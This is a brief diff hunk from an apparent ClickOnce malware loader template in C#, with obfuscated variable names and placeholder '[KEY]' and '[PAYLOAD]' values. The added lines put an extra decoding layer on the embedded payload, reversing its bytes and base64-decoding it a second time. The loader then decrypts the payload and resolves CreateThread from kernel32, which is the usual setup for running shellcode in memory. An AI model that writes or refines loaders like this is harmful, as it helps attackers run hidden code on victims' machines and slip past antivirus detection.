@@ -46,6 +46,9 @@ namespace ClickOnceTemplate
             {				
 				byte[] VAR9 = {[KEY]};
 				byte[] VAR10 = Convert.FromBase64String("[PAYLOAD]");
+				Array.Reverse(VAR10, 0, VAR10.Length);
+				VAR10 = Convert.FromBase64String(Encoding.ASCII.GetString(VAR10));
+				
 				byte[] VAR11 = VAR16.VAR28(VAR9, VAR10);
 				IntPtr VAR33 = LoadLibrary("kernel32.dll");
 				IntPtr VAR34 = GetProcAddress(VAR33, "CreateThread");
